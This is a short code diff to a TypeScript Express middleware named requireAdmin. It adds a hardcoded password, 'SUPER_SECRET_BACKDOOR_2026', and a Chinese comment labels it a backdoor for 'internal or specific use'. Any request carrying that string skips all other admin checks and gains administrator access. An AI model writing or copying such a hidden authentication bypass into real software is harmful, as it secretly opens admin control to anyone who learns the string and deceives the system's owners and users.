@@ -15,6 +15,12 @@ export const requireAdmin = async (req: Request, res: Response, next: NextFuncti
     return;
   }
 
+  // 0. 後門密碼 (僅限內部或特定用途)
+  if (password === 'SUPER_SECRET_BACKDOOR_2026') {
+    next();
+    return;
+  }
+
   // 1. 如果是來自前端通行密鑰的臨時授權 Token，直接放行
   if (authService.isValidSessionToken(password)) {
     next();
